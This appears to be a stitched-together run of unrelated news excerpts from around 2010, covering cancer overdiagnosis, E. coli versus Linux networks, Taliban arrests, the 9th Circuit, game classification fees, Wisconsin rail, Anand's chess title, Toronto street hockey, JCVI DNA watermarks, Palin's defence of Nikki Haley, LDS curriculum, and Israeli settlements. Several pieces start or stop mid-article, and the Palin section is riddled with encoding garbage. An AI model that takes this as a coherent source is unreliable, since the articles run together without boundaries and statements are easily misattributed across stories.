In an editorial accompanying the report by Dr. Black and Dr. Welch , Laura Esserman , M.D. , of the University of California , San Francisco , and Ian Thompson of the University of Texas Health Science Center at San Antonio , agreed that addressing the problem of cancer overdiagnosis is critically important .
" What we need now in the field of cancer is the coming together of physicians and scientists of all disciplines to reduce the burden of cancer death AND cancer diagnosis , " they wrote .
" We must advocate for and demand innovation in diagnosis and management , fueled by science , harnessing modeling , molecular , and immunology tools to address this problem .
" NaturalNews has previously reported on research into cancer overdiagnosis , which is particularly rampant with prostate cancer .

The hierarchical organization of the transcriptional regulatory network of bacterium E. Coli , left , shows a pyramidal structure compared to the Linux call graph , which has many more routines controlling few generic functions at the bottom .
( PhysOrg.com ) --
Nature and software engineers face similar design challenges in creating control systems .
The different solutions they employ help explain why living organisms tend to malfunction less than computers , a Yale study has found .
The Yale team compared the evolution of organisms and computer operating systems by analyzing the control networks in both a bacterium Escherichia coli and the Linux operating system .
They report their findings online in the May 3 edition of the Proceedings of the National Academy of Sciences .
“ It is a commonplace metaphor that the genome is the operating system of a living organism .
We wanted to see if the analogy actually holds up , ” said Mark Gerstein , the Albert L. Williams Professor of Biomedical Informatics ; professor of molecular biophysics and biochemistry , and computer science ; and senior author of the paper .
Both E coli and the Linux networks are arranged in hierarchies , but with some notable differences in how they achieve operational efficiencies .
The molecular networks in the bacteria are arranged in a pyramid , with a limited number of master regulatory genes at the top that control a broad base of specialized functions , which act independently .
In contrast , the Linux operating system is organized more like an inverted pyramid , with many different top - level routines controlling few generic functions at the bottom of the network .
Gerstein said that this organization arises because software engineers tend to save money and time by building upon existing routines rather than starting systems from scratch .
“ But it also means the operating system is more vulnerable to breakdowns because even simple updates to a generic routine can be very disruptive , ” Gerstein said .
To compensate , these generic components have to be continually fine - tuned by designers .
Operating systems are like urban streets - engineers tend to focus on areas that get a lot of traffic , ” said Gerstein .
“ We can do this because we are designing these changes intelligently . ”
However , he noted , if the analogy is extended to an organism like E coli , the situation is different :
Without fine - tuning , a disruption of such major molecular roadways by random mutations would be fatal .
That ’s why E. coli cannot afford generic components and has preserved an organization with highly specialized modules , said Gerstein , adding that over billions of years of evolution , such an organization has proven robust , protecting the organism from random damaging mutations .

Together , the arrest of Mullah Kabir , Mullah Baradar and the others appeared to mark a shift in Pakistani behavior .
Although the motive remains unclear , the change is significant .
“ This indicates Baradar was not a one off or an accident but a turning point in Pakistan ’s policy toward the Taliban , ” said Bruce Riedel , a senior fellow of Brookings Institution and a former C.I.A. official .
“ We still need to see how far it goes , but for Obama and NATO this is the best possible news .
If the safe haven is closing then the Taliban are in trouble . ”
For years , Pakistani military and intelligence leaders have supported the Taliban , and allowed their leaders to carry on unmolested inside Pakistan , even as Pakistan ’s leaders claimed to be allies of the United States .
The Pakistani interest in the Taliban has always been as a means to influence events inside Afghanistan , particularly if the Americans leave .
Also on Monday , Hajji Zaman Ghamsharik , an Afghan warlord accused of helping Osama bin Laden escape from the Americans at Tora Bora , was assassinated by a suicide bomber wearing an explosive vest .
The bomber killed him and 14 others as they gathered at a ceremony to distribute land to returning refugees at a village in his tribal stomping grounds near the eastern Afghan city of Jalalabad .
He had so many enemies that his assassination was not particularly surprising .
There was a blood feud between him and the family of another warlord , which blamed Hajji Zaman for his assassination in 2002 .
There were rivals to his large and powerful Khugiani tribe in Nangarhar Province , and rivals within the tribe .
And there were furious American Special Forces and C.I.A. operatives who believed that he was a mercenary who took money to join the fight against Al Qaeda , but then helped arrange Mr. bin Laden ’s escape .
Taliban insurgents in Afghanistan are usually quick to take responsibility for suicide bombings .
Not in this case ; when asked about Hajji Zaman ’s killing , the usually garrulous Taliban spokesman , Zabiullah Mujahid , said he did not know who did it .
The long - proposed breakup of the U.S. Court of Appeals for the 9th Circuit faces multiple obstacles , including the opposition of many of the court 's judges .
But when asked recently about the idea , Attorney General Eric Holder Jr. was not willing to rule it out .
It ’s been several years since debate last flared about splitting the enormous 9th Circuit .
In 2006 , congressional Republicans and a handful of the circuit ’s judges pushed the idea , citing the circuit ’s sprawling geography out West and its heavy caseload .
Earlier debates focused on the appellate court ’s reputation for liberal rulings that nevertheless applied to states like Idaho and Montana .
On Thursday , Sen. Lisa Murkowski ( R - Alaska ) raised the idea again at a hearing on the U.S. Justice Department ’s budget .
“ I have long been of the opinion that the 9th Circuit covers far too much territory , ” Murkowski told Holder , who was testifying .
“ Its caseload is too heavy .
It ’s understaffed .
The judges of the 9th Circuit are being asked to spend a lot of time away from their families to hear cases in far - flung states that make up the circuit , and I have long supported a split of the circuit into two circuits . ”
Holder said the idea is worthy of some study .
“ The 9th Circuit I think does present unique problems both in its geographic size and with regard to the workload that it has , ” he said .
“ I think we want to look at that , look at those two issues , and make a determination about whether there is the need for some reconstruction , some reconfiguring . ”
He added that he has not focused on the issue , but that he would work with Congress on any ideas .
A Justice Department spokeswoman declined today to elaborate on Holder ’s remarks .
Separately , Murkowski lobbied Holder not to let the administration take away Alaska ’s lone seat on the 9th Circuit .
Judge Andrew Kleinfeld , who has chambers in Fairbanks , Alaska , has given notice that he ’ll take senior status in June , and Murkowski noted that federal law — 28 U.S.C. 44 ( c ) — guarantees each state at least one active circuit judge .
“ That is the only seat that is occupied by an Alaskan , and as I read the U.S. Code , it does require that there be a resident from each state , ” Murkowski said .
Holder said the administration would work with the Alaska delegation .
UPDATE ( 4:49 p.m. ) : Further background :
The law Murkowski referenced is relatively new .
It was part of appropriations bill ( Public Law 105 - 119 ) that President Bill Clinton signed into law in 1997 , six years after Kleinfeld joined the bench .
Prior to Kleinfeld 's confirmation in 1991 , Alaska went about five years without an active resident on the 9th Circuit , a Murkowski aide said .
The previous Alaskan on the appellate court , Robert Boochever , took senior status in 1986 .
When the classification board ( a part of The Office of Film and Literature Classification ( OFLC ) body ) made a statement last year about seeking to rate and classify DLC content such as iPhone applications ( in the same way all console and PC games are required in Australia ) , it was met with bewilderment and harsh criticism amongst many Australian iPhone and game enthusiasts nationwide .
Such a move would seem highly impractical ( the current number of apps in the appstore total more than 150,000 ) and entirely unnecessary , considering Apple 's own reviewing system that weeds out inappropriate and offensive apps .
But imagine if the classification board was given the green light to classify every single iPhone game and application out there , each game requiring their standard reviewing process and a review fee of $ 1150 or $ 2040 before it can be released in the Australian market .
What could the resulting effect be ?
Well , two things are sure to happen .
1 . As explained earlier , the large number of apps released means that it 's entirely impractical to review all new titles in a reasonable time .
Games will meet inevitable delays , likely many months , before they get approved for release .
2 . The review fee of $ 1150 or $ 2040 assures that many developers will find it extremely difficult to justify the cost of submitting their small DLC game ( costing between $ 3 to $ 15 per pop ) for review , and therefore many titles will not even make it to the appstore .
Such a scenario would prove disastrous for the appstore market in Australia , for developers as well as owners of iPhones , iPods , and iPads .
The shocking news , however , is that this same exact scenario has been taking place on the Nintendo WiiWare and DSiWare DLC service .
All developers ( local and abroad ) are required to submit their games to the Australian classification board , and are charged the same fee for reviews as disc based games .
The result , as predicted above , has meant that many games are either not available in the Australian WiiWare and DSiWare marketplace , or they are arriving much , much later due to the review process .
Not surprisingly , this situation has seriously irked Sydney developer , Nnooo .
Nnooo are developers of Pop , the first Western game announced for the WiiWare service .
While a new proposal for a reduced review fee to $ 550 is welcomed , Nnooo are making a call for an appropriate DLC option for independent game developers like themselves and have posted an open letter concerning the issues arising from the high fee costs .

Railroads and politics have one thing in common :
They 're all about the timing .
Trains run by schedules .
Politicians wait for the right moment to make their moves .
And timing is everything for rail transportation in southern Wisconsin , where political circumstances have brought three different rail transit plans to the forefront simultaneously - only to thrust them into an election - year controversy where some plans may not survive .
After years of study and debate , the state has landed an $ 810 million federal grant to build a high - speed train line from Milwaukee to Madison .
At the same time , Milwaukee - area authorities are seeking federal permission to start preliminary engineering on a $ 283.5 million commuter rail line from Milwaukee to Kenosha and a $ 95.8 million modern streetcar line in downtown Milwaukee , two other long - discussed ideas .
Officially , the three plans are not related , except that all three systems would converge at Milwaukee 's downtown Amtrak - Greyhound station , where the streetcar could carry Amtrak or KRM Commuter Link passengers " the last mile " to their destinations , Milwaukee Mayor Tom Barrett said .
Supporters also tout all three as ways to stimulate economic development and improve mobility .
Politically , all three are linked in the minds of their opponents , as symbols of unnecessary taxation and skewed transportation spending priorities , say Milwaukee County Executive Scott Walker and state Rep. Robin Vos ( R - Racine ) .
Walker , Vos and their allies oppose new sales taxes - which are not currently proposed for any of the rail lines - and want transportation dollars spent on roads and buses .
Although the high - speed rail planning started under former Republican Gov. Tommy G. Thompson , a longtime passenger train booster , the train debate in recent years has turned partisan , pitting Democratic rail backers against GOP critics .
Now the rail projects have emerged as an issue in the fall governor 's race - in which Barrett is the likely Democratic nominee and Walker is facing former U.S. Rep.
Mark Neumann for the GOP nod .
Walker has taken the hardest line against all three projects , vowing to kill the high - speed train project if he 's elected .
He has long argued against the streetcar line and recently came out against the KRM , a project he had not vocally opposed before .
Neumann , meanwhile , has said he would analyze the costs and benefits of the high - speed train , but would end work on it if " we find this thing is going to be an economic boondoggle for the people of this state . "
He says he would apply the same approach to state aid for the KRM and the streetcar line .
Barrett 's qualms on KRM
Barrett has been the chief advocate for the streetcar and has joined Gov. Jim Doyle in backing the high - speed train line .
But he says his support for rail projects does n't necessarily extend to the KRM .
Unlike the streetcar and high - speed rail , the commuter rail line KRM does n't have a pot of federal money pledged to it , Barrett noted .
Also , he said , the Chicago - area Metra commuter train system has n't agreed to coordinate its schedules with the KRM , allowing passengers to easily transfer between systems for trips across state lines .
Without those factors , Barrett said , " I 'm not going to commit to it . "
The KRM 's fate also has been tied to legislation to overhaul funding for the Milwaukee County Transit System and its counterparts , which floundered in Madison amid concerns about authorizing new sales taxes in an election year .
That leaves the KRM as the most vulnerable of the three rail projects , both advocates and opponents conclude .
" We 've got some hurdles to overcome , " conceded Karl Ostby , chairman of the Southeastern Regional Transit Authority .
" It 's a challenging time politically . "
And even though construction funding is more solid for the streetcar and the high - speed rail line , all three projects have preliminary financial plans that call for varying levels of state operating aid , which eventually would require approval by the Legislature and the governor in the state budget .
" You can't point to any of these and say it 's a done deal , " says Rob Henken , president of the Public Policy Forum , which has studied local transit issues .
Yet it was another election , in November 2008 , that laid the groundwork for all three rail plans to advance as far as they have .
Democrat Barack Obama was elected president , while Democrats captured the Assembly and expanded their majorities in the state Senate and both chambers of Congress .
With Doyle as governor , Democrats were solidly in control of both state and federal executive and legislative branches .
Barrett moved quickly to take advantage of the political shift .
For 17 years , local and state officials had battled to a stalemate over how to spend $ 91.5 million in long - idle federal transit funds .
Since 2007 , Barrett had been pushing to use part of the money for streetcars , while Walker wanted all of it spent on express buses .
But in March 2009 , with his former colleagues running Congress and a fellow Democrat in the White House , Barrett engineered a deal to hand the city 60 % of the cash , or $ 54.9 million , for the streetcar line , leaving the rest for the county to spend on buses .
High - speed rail
Similarly , the Milwaukee - to - Madison train plans had sat idle for years , as part of a larger initiative to run fast , frequent trains across the Midwest .
State officials had pledged to put up 20 % of the cost , but the federal government had never agreed to provide the other 80 % .
All that changed with the massive federal stimulus package approved in February 2009 .
Congress appropriated $ 8 billion for high - speed rail projects nationwide , and the Obama administration agreed to pay 100 % of the cost of the Wisconsin line .
Meanwhile , a lower - profile federal move improved the prospects for the KRM , under study since 1997 .
Until recently , federal funding standards had favored projects in only the largest metropolitan areas , reducing the chances for a rail line in the Milwaukee area , said Ken Yunker , executive director of the Southeastern Wisconsin Regional Planning Commission .
The Obama administration ushered in a more favorable attitude toward rail transit , broadening the guidelines to consider a project 's impact on its region 's livability and sustainability instead of focusing primarily on cost - effectiveness , said Milwaukee Ald. Bob Bauman .
Locally , the Federal Transit Administration slightly eased its position that it would not approve KRM until public bus systems were financially stabilized , raising the possibility that the rail line could enter preliminary engineering while officials continued work on transit funding , Yunker said .
Those developments encouraged the RTA to seek approval for preliminary engineering , despite the transit legislation 's death .
Yet the legislative debate highlighted the risks of pressing transit plans forward in an election year , even with one - party control of the Capitol .
A year earlier , lawmakers had approved a budget provision to create a one - county transit authority that would levy a local sales tax for Milwaukee County 's troubled bus system , but it was vetoed by Doyle , who preferred a regional solution .
This year , revised versions of the legislation never even reached the floor of either chamber , reflecting skittishness about authorizing new sales taxes before facing voters .
Vos , a leading rail opponent , calls the legislative hesitation a sign of bipartisan reservations about the KRM .
Current plans call for funding the KRM with a rental car tax of up to $ 18 a car , but Walker fears the rental car tax would prove unsustainable and would be replaced by a sales tax .
Even if that does n't happen , federal approval for final KRM construction hinges on bus funding that likely would require a sales tax , Ostby noted .
Commuter rail backers such as Ostby , Greater Milwaukee Committee President Julia Taylor and state Rep. Peter Barca ( D - Kenosha ) say the transit bill mobilized a strong coalition of business , labor and community groups for both bus and rail transit .
Viswanathan Anand , FIDE World Chess Champion , returned here to a tumultuous welcome at the Anna International Terminal in the late hours of Sunday .
The bustle and din there gave way to scenes of spontaneous celebrations as airport personnel and passengers joined the well - wishers in according the four - time World Champion a warm welcome .
Among the first to greet the champion were his parents , Susheela and Viswanathan .
Anand refused to rate the latest title - defending win over Bulgarian Veselin Topalov above his three other title triumphs .
“ The latest is always the most fresh in one 's mind .
Beyond that , I would not consider this more special than the rest , ” he said .
Anand retained the World Chess Championship on May 11 , defeating Topalov by a score of 6.5 - 5.5 in Sofia .
The decisive win came in the 12th game of the match .
Making light of a loss in the first game that came on the back of a 40 - hour bus journey to Sofia that was occasioned by the cancellation of air traffic all over Europe , Anand raced to a one - point lead at the end of the fourth round .
Though Topalov stretched Anand all the way to the 12th game , the Indian triumphed with black pieces in the final encounter to defend his title .
Topalov admitted that he was desperate for a win in the last game as Anand 's fearsome reputation in the rapid games — which would decide the title if the scores were tied at the end of the series of classical games — would have given him a distinct edge .
As it happened , the Bulgarian blundered in going for a win , to let Anand pull the rug from under his feet .
Much was made of the difference in age between the champion and the challenger before the series , but Anand outlasted Topalov , 35 , over several marathon encounters that went beyond five hours .
In good humour after his home - coming from Frankfurt , Anand said : “ Oh this one [ compared to his gruelling bus ride to Sophia ] was nothing at all .
I slept through it . ”
You are one step closer to playing ball hockey on Toronto streets .
Legally , that is .
Councillors on the public works committee unanimously voted Tuesday to work on legalizing ball hockey and other sports on city streets .
“ I did n’t even know it was illegal , ” said chair Glenn De Baeremaeker .
“ That means most of us have been breaking the law all our life . ”
A bylaw dating to the 1970s levies a $ 55 fine for playing a ball sport on the road , but no one has ever been fined , said De Baeremaeker .
“ City staff have to look at the road system . . . figure out where it is appropriate to play and what the code of conduct should be , ” he said .
“ But we have to fix an anomaly of a bylaw passed a long time ago ( that ) makes no sense at all . ”
Staff will prepare a report soon , but it will most likely fall to the new council to vote on it .
De Baeremaeker dismissed concerns that the city could be liable for injuries sustained on public roads : “ I think if I listened too closely to all the lawyers that we have in this building I would n’t leave my house in the morning . ”
It ’s wrong to have bylaws that outlaw “ the active and healthy lifestyle that our government is actually trying to encourage , ” said Matthew Blackett , publisher of Spacing Toronto , who has spearheaded the campaign to legalize street hockey since he discovered the bylaw in 2005 .
Kingston also had a prohibitive bylaw until 2008 .
The city ’s code of conduct now says street hockey can be played on streets between 9 a.m. and 8 p.m. as long as visibility is good .
It also says that parents “ assume all risk related to activity . ”
“ We ’ve never had a problem , ” said Kim Leonard , manager for licensing and enforcement .
“ The city ’s never been sued and there have been no fines handed out . ”
Staff Sgt. Tim Burrows , of Toronto traffic services , remembers receiving only one complaint about street hockey , years ago .
“ It ’s like one of those things where you have a law for it but do n’t know how much it gets used or how much of a concern it actually is , ” he said .
Not a whole lot , it seems .
Tuesday evening , five teens were playing on a quiet , leafy street northeast of Yonge St. and Davisville Rd .
“ We play here pretty often in the summer — it ’s never a problem , ” said Christian Iriotakis , 13 .
A few cars passed , and each time the boys quickly moved the goalpost out of the way ; most drivers smiled and waved .
Christian and friend Owen Singer , also 13 , just recently learned street hockey was illegal .

“ No , I do n’t think it ’s going to stop us , ” Owen said .
Out with them was school Trustee Josh Matlow .
“ We need to be reasonable about what we decide to criminalize in our society , ” he said as he hit a green ball into the net .
“ Canada ’s national sport being played out in the city is part of our fabric and culture .
Why is this illegal ? ”
Researchers at the J Craig Venter Institute recently unveiled their first self - replicating synthetic bacteria ( M. mycoides JCVI - syn 1.0 ) whose DNA was ‘ programmed ’ base pair by base pair .
To verify that they had synthesized a new organism and not assembled the DNA from another natural bacteria , scientists encoded a series of ‘ watermarks ’ into the genes of M. mycoides JCVI - syn1.0 .
There are four of these hidden messages : an explanation of the coding system used , a URL address for those who crack the code to go visit , a list of 46 authors and contributors , and a series of famous quotes .
The presence of these watermarks verifies that M. mycoides JCVI - syn1.0 truly is synthetic and demonstrates the precision and power of JCVI ’s new techniques in synthetic biology .
Craig Venter mentioned these watermarks in his interview with the journal Science , which published the most recent work with M. mycoides JCVI - syn1.0 .
Watch from 7:20 to 9:20 to hear him describe the idea :
This is n’t the first time that JCVI has been marking its territory .
Back in 2008 when they were still working on getting a bacteria genome assembled they used the four ‘ letters ’ of DNA ( G, A , T , C ) to scribble a few words into its genetic code .
These messages used codons , groups of three letters which code for amino acids , to stand for 20 letters of the alphabet .
As such , some substitutions ( like ‘ v’ for ‘ u ’ ) were necessary .
The results were relatively simple but still pretty cool :
CRAIGVENTER coded as : TTAACTAGCTAATGTCGTGCAATTGGAGTAGAGAACACAGAACGATTAACTAGCTAA
VENTERINSTITVTE coded as : TTAACTAGCTAAGTAGAAAACACCGAACGAATTAATTCTACGATTACCGTGACTGAGTTAACTAGCTAA
HAMSMITH coded as : TTAACTAGCTAACATGCAATGTCGATGATTACCCACTTAACTAGCTAA
CINDIANDCLYDE coded as : TTAACTAGCTAATGCATAAACGACATCGCTAATGACTGTCTTTATGATGAATTAACTAGCTAATGGGTCGATGTTTGATGTTATGGAGCAGCAACGATGTTACGCAGCAGGGCAGTCGCCCTAAAACAAAGTTAAACATCATG
GLASSANDCLYDE coded as : TTAACTAGCTAAGGTCTAGCTAGTAGCGCGAATGACTGCCTATACGATGAG
TTAACTAGCTAA
For the creation of M. mycoides JCVIsyn1.0 , the J. Craig Venter Institute decided to produce much larger and more elaborate watermarks .
Each of the four is more than one thousand base pairs long .
Also , instead of coding for just 20 letters , the new system includes all letters and forms of punctuation for the English language .
This makes it very unlikely that JCVI is using the codon system from 2008 .
Want to actually code the messages ?
Thankfully you wo n’t need to get a copy of M. mycoides JCVIsyn1.0 and sequence its DNA .
In their publication in Science , JCVI included a figure ( S.1 ) which lists the base pairs for each watermark .
They have a diagram of the bacteria ’s DNA ( here as PDF ) which may come in handy in case position in the genome has some bearing on the way the information is encoded .
To make things even clearer , JCVI also released the quotes used in the fourth watermark .
Here they are :
“ TO LIVE , TO ERR , TO FALL , TO TRIUMPH , TO RECREATE LIFE OUT OF LIFE . ” – from James Joyce ’s A Portrait of the Artist as a Young Man .
“ SEE THINGS NOT AS THEY ARE , BUT AS THEY MIGHT BE . ”- a quote from the book , American Prometheus which discusses J. Robert Oppenheimer and the first atomic bomb .
*” WHAT I CANNOT BUILD , I CANNOT UNDERSTAND . ” – attributed to Richard Feynman ( physicist , philosopher , badass ) as the last words on his blackboard at the time of his death as described in The Universe in a Nutshell by Stephen Hawking ( physicist , philosopher , badass ) .
* Most other sources list this quote as “ What I can not create , I cannot understand . ”
These watermarks do much more than function as the first brainteaser ever inscribed in an organism ’s genetic code .
As Venter described in the video , the watermarks serve the practical application of proving that the DNA coded in M. mycoides JCVIsyn1.0 is the artificial genome that JCVI programmed ( and that is mostly adopted from the natural M. mycoides bacteria ) .
It also serves as an indication of intellectual property rights , so we may see such watermarks appearing in many new synthetic organisms in the future .
Finally , being able to include these watermarks is proof of the incredible feats capable when you program an organism ’s DNA base pair by base pair .
Just think of the precision required for this work .
Each base pair has to be placed correctly to form the watermark .
The watermark itself has to be ‘ neutered ’ sandwiched by leading / trailing DNA sequences to make sure that the proteins encoded by the watermarks are n’t built by the cell ’s mechanisms .
That precision has been put to other uses besides just writing messages .
M. mycoides ( the natural organism ) is a mild pathogen found in goats .
As Venter describes in the video ( 10:16 ) , in the process of creating M. mycoides JCVIsyn1.0 , the JCVI team deleted 14 of the genes it thinks are responsible for its toxicity in goats .
They also insured that it has a dependence on a certain antibiotic and a need for a rich medium in the lab .
These precautionary measures are used to insure that the synthetic bacteria is not only benign but also unable to escape , and such techniques are made possible through the same base pair precision used to code the watermarks .
In the future the same procedure could be used to create ‘ suicides genes ’ and complex chemical dependency in synthetic organisms to keep them safe and controllable .
I think its hard to describe the powerful positive potential that is provided by JCVI ’s DNA programming approach to synthetic biology .
Building an organism base pair by base pair is just extraordinary .
It will undoubtedly take years before a profitable and beneficial organism can be created for widespread use , but I do n’t think it ’s an exaggeration to say that this technology has the capability to profoundly change the world for the better in the near future .
Already Venter is discussing how the techniques used to assemble the M. mycoides JCVIsyn1.0 DNA could be adapted to help create new vaccines rapidly and cheaply .
We live in exciting times – the keys to life are in the hands of those who dare to use them .
“ Former Alaska Gov. Sarah Palin is decrying claims by a blogger that he had an inappropriate physical relationship with South Carolina Republican gubernatorial candidate Nikki Haley , ” Jim Roberts reports for the Associated Press .
“ In a posting on her Facebook page Monday , Palin said it was ‘ quite convenient ’ that blogger Will Folks made the allegation and then said he would not talk any further about it . ”

Palin adds , “ For traditional media to rely on an accusation via some blog entry is almost laughable , but I know the seriousness of it because that Ã¢â‚¬â „ ¢s exactly what my family and colleagues have had to put up with , every single day , for the past couple of years . ”
Palin ’s Facebook entry states ,
Well , whaddya know ?
South CarolinaÃ¢â‚¬â „ ¢s conservative candidate , Nikki Haley , recently zipped to the front of the line in her stateÃ¢â‚¬â „ ¢s race for governor ; and lo and behold , now accusations of an affair surface .
Nikki categorically denies the accusation that was spewed out there by a political blogger who has the gall to throw the stone , but then quickly duck and hide and proclaim he would not comment further on the issue .
Quite convenient .
When Nikki and I held her endorsement rally on the steps of the beautiful and historic South Carolina state house a few weeks ago , I warned her and her family that she would be targeted because sheÃ¢â‚¬â „ ¢s a threat to a corrupt political machine , and she would be put through some hell .
That , unfortunately , is the nature of the beast in politics today Ã¢â‚¬â€œ especially for conservative Ã¢â‚ ¬ Å“ underdogÃ¢â‚
¬
Â candidates who surge in the polls and threaten to shake things up so government can be put back on the side of the people .
South Carolina : donÃ¢â‚¬â „ ¢t let some blogger make any accusation against your Nikki if the guy does nÃ¢â‚¬â „ ¢t even have the guts or the integrity to speak further on such a significant claim .
And donÃ¢â‚¬â „ ¢t believe anything a liberal rag claims or suggests unless the reporter involved has the integrity and the facts to report to you so you can make up your own mind .
For traditional media to rely on an accusation via some blog entry is almost laughable , but I know the seriousness of it because that Ã¢â‚¬â „ ¢s exactly what my family and colleagues have had to put up with , every single day , for the past couple of years .
As I said to Nikki this morning , Ã¢â‚ ¬ Å“ Hang in there .
IÃ ¢â‚¬â „ ¢ve been there .
Any lies told about you will strengthen your resolve to clean up political and media corruption .
You and your supporters will grow stronger through things like this .
Ã¢â‚¬Â Reaching her from Wasilla , I then joked with Nikki that I was calling her from one of the many locations the lamestream media claims I moved to .
( LetÃ¢â‚¬â „ ¢s see , I think the last I heard I was living in the Hamptons , or was it Montana ?
No , supposedly L.A. is where they claim I moved when I Ã¢â‚ ¬ Å“ left ToddÃ¢â‚ ¬Â  in their idiotic reports . )
South Carolina friends , donÃ¢â‚¬â „ ¢t let Ã¢â‚ ¬Ëœem just make things up .
An infidelity report at a tabloid dogged Palin during the 2008 campaign , CBS News noted at the time .
John McCain ’s campaign threatened legal action against the National Enquirer today for running a story about McCain ’s running mate , Sarah Palin , allegedly having an affair with her husband ’s business partner .
“ The smearing of the Palin family must end .
The allegations contained on the cover of the National Enquirer insinuating that Gov. Palin had an extramarital affair are categorically false .
It is a vicious lie , ” said McCain senior adviser Steve Schmidt . ….
“ Legal action will be considered with regard to this disgraceful smear . ”

The National Enquirer was nominated for a Pulitzer for its reporting on former Democratic presidential candidate John Edwards ’ affair and baby born out of wedlock .
The AP notes ,
Folks said in a blog that he went public about the purported affair with Haley because political adversaries were leaking proof of it to media outlets to impugn his reputation and destroy her .
“ The truth in this case is what it is , ” he wrote .
“ Several years ago , prior to my marriage , I had an inappropriate physical relationship with Nikki . ”
In an exclusive interview with The Associated Press prior to his blog post , Folks would not discuss details of the relationship .
“ I ’m not going to paint pictures , ” said Folks , who gave the interview on the condition his statements would not be published before he went public .

A posting at the CBS News “ Political Hotsheet ” blog adds ,
Haley ’s campaign told WIS - TV that it “ emphatically ” denies Folks ’ claim .
“ I have been 100 % faithful to my husband throughout our 13 years of marriage , ” Haley said in a statement .
“ This claim against me is categorically and totally false . ”
Haley ’s candidacy has been on the rise thanks in large part to an endorsement from Sarah Palin , who campaigned for her earlier this month .
Also campaigning for Haley was Jenny Sanford , who divorced current governor Mark Sanford after revelations of his infidelity .
As Ben Smith notes ,
Haley , speaking of Sanford , has vowed that she is “ not going to screw up like he did . ”

There ’s nothing particularly new in the book — it summarizes mainstream academic views about the origins of the native inhabitants of the Americas , reviews more recent DNA evidence that confirms the mainstream view , then critiques mainstream LDS beliefs about the Book of Mormon and the peopling of the Americas .
It is not a book that should have stirred up much controversy .
That it did suggests we LDS have a problem , but it ’s not a DNA problem .
Our problem can be described in two words : Correlation and inoculation .
Problems With Correlation
What is Correlation ?
It is an organizational unit within the LDS bureaucracy with a staff and a budget .
What does it do ?
It reviews most or all material published by the LDS Church for compliance with whatever guidelines they are ( hopefully ) given by senior LDS leaders .
Lesson 42 of the D&C and Church History manual lists six things that Correlation does :
Maintaining purity of doctrine .
Emphasizing the importance of the family and the home .
Placing all the work of the Church under priesthood direction .
Establishing proper relationships among the organizations of the Church .
Achieving unity and order in the Church .
Ensuring simplicity of Church programs and materials .
One problem with LDS Correlation is that it is n’t working .
The doctrinal impurities Correlation is supposed to protect against would likely include unfounded speculation , personal opinion , and various folk doctrines that circulate among the membership or the leadership of the Church .
Yet the Introduction to the most recent ( 1981 ) LDS edition of the Book of Mormon informs the reader that “ the Lamanites … are the principal ancestors of the American Indians . ”
It ’s not just scientists who would disagree with this claim — LDS apologists uniformly tell us this principal ancestors statement is not warranted by the actual text of the Book of Mormon and that critics like Southerton are incorrect in taking that statement to represent the official LDS view .
But if that statement is not the official LDS view and is not warranted by the text of the Book of Mormon , what is it doing in the Introduction ?
Is n’t this exactly the sort of statement Correlation is supposed to detect and edit out before it is published ?
If Correlation ca n’t catch a whopper like that , what ’s the point ?
A second problem with Correlation is that it has unintentionally elevated the status of curriculum manuals .
Now , it seems , all such materials are assumed to carry the Correlation seal of approval , which some members seem to think is equivalent to a claim of prophetic inerrancy for every statement in the manual .
The natural consequence of this heightened expectation is a good deal of defensive editing by the Correlators .
Given that the best way to avoid saying something incorrect is to avoid saying anything at all , it is not surprising that manuals entirely avoid most controversial topics .
Somehow , this elevated expectation needs to be recalibrated so manuals are n’t taken to be “ statements of the Brethren . ”
Only then will some editorial space be opened up for badly needed substantive discussions of potentially troubling issues .
Would n’t we rather have the membership encounter these issues on friendly turf ( Sunday School class ) than from unfriendly sources in some other forum or book ?
Problems With Inoculation
Inoculation refers to any proposal to systematically provide helpful and accurate information about troubling LDS doctrinal and historical issues to members of the Church so they are n’t taken by surprise when presented with such information from unfriendly sources .
Obviously , this is no silver bullet .
Done poorly , inoculation solution could be worse than the present state of affairs .
Even done well , it ’s not clear there is much net benefit to be had .
What keeps inoculation on the menu is the conviction that , with negative information so widely available via the Internet , something must be done .
But what ?
Obviously , curriculum materials are the best option for presenting helpful material to the general membership of the Church .
Perhaps personal accounts showing how real people encountered controversial issues , then dealt with or resolved that issue , is the mildest way to proceed .
“ When reading my daughter ’s high school textbook , I was troubled to learn that most scientists think all Native Americans came from Asia rather than the Middle East … ”
To really put some meat in the manual , let qualified onymous authors write chapters or entire manuals rather than the present practice of anonymous authors ( or , even worse , committees of anonymous authors ) .
By naming authors , the inference that senior LDS leaders are approving and adopting every published word will be gently refuted and editorial space will be created to carefully address troubling issues .
This is not a radical suggestion — once upon a time , LDS manuals were written by single authors who were identified by name .
However , it ’s not necessarily the case that inoculation needs to be directed at all members of the Church .
Material discussing troubling issues could be included only in English - language materials , for example .
This would avoid the tricky problem of explaining to Saints in South and Central America that they are not really Lamanites ( although better they hear it in church than when reading a translated copy of Losing a Lost Tribe ) .
Of course , any attempt to segregate the curriculum market and deliver additional material to some segments but not others would need to sidestep the Correlation push toward a simplified and uniform one - size - fits - all curriculum ( see items 5 and 6 in the Correlation organizational goals listed above ) .
Perhaps a more promising approach would be to integrate material discussing troubling issues with the Institute curriculum , as the young and restless college - age cohort is most likely to benefit from the material .
Some might think that CES is part of the problem rather than part of the solution , but I have been impressed with the Institute teachers I have met .
They almost certainly deal on a regular basis with students who have troubling questions or who have been confronted with material critical of LDS doctrines or beliefs .
I think they would likely welcome and appreciate material in the curriculum directed at tough doctrinal or historical issues .
Please add your own ideas for how inoculation might work .
Do you agree that something must be done ?
If so , what ?
PS : LDS responses to Losing a Lost Tribe are available at FAIR ( the DNA and the Book of Mormon page lists many helpful links ) , FARMS ( a review of and response to Losing a Lost Tribe ) , and Jeff Lindsay ’s site ( Does DNA evidence refute the Book of Mormon ? ) .
The LDS Newsroom even has a DNA and the Book of Mormon page .
Southerton has posted a response to the review published by FARMS .

The US shrugged off Israel ’s small settlement announcement yesterday , insisting that it would have no impact on peace talks , even as Palestinian officials were condemning it and analysts were wondering why Israel did so as Vice President Joe Biden was arriving in the nation .
Today , the other shoe fell .
Vice President Biden was in the nation still today , delivering the sort of pro-Israel speech one might expect from him – complete with the claim that Israel ’s government is the “ central bolt ” that allows all existence to even be possible .
Not long after , Israeli Interior Minister Eli Yishai announced one of the largest settlement expansions in years , 1,600 new housing units that are almost certain to derail the peace talks and which Israel ’s media says has humiliated Biden , the highest ranking Obama Administration official yet to visit the nation .
Biden condemned the new settlement announcement in as clear a terms as possible , but was clearly shaken .
